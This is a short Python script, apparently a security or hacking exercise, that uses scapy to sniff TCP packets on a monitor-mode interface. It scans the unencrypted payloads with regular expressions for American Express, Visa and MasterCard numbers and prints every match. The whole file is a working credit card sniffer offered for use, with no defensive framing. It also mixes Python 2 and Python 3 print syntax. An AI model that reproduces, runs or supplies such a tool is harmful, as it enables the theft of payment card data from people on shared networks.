# Python script uses interface in monitor mode to sniff packet information
# looking for credit cards. Will detect only American express, Visa and MasterCard
# information. For now only card number and will work on unencrypted packets

import re
import optparse
from scapy.all import *

def find_credit_card(pkt):
	raw = pkt.sprintf('%Raw.load%')
	america_re = re.findall('3[47][0-9]{13}', raw)
	visa_re = re.findall('4[0-9]{12}(?:[0-9]{3})?', raw)
	master_re = re.findall('5[1-5][0-9]{14}', raw)

	if america_re:
		print ('[+] Found American Express card: '+america_re[0])

	if visa_re:
		print ('[+] Found Visa card: '+visa_re[0])

	if master_re:
		print ('[+] Found Master card: '+master_re[0])


# Option parsing
parser = optparse.OptionParser('usage % prog -i <interface>')
parser.add_option('-i', dest='interface', type='string', help='specify interface in monitor mode to listen on') 
(options, args) = parser.parse_args()
if options.interface == None:
	print parser.usage
	exit(0)

else:
	conf.iface = options.interface

try: 
	print( '****Starting Credit Card Sniffer****')
	sniff(filter='tcp', prn=find_credit_card, store=0)
except KeyboardInterrupt:
	exit(0)


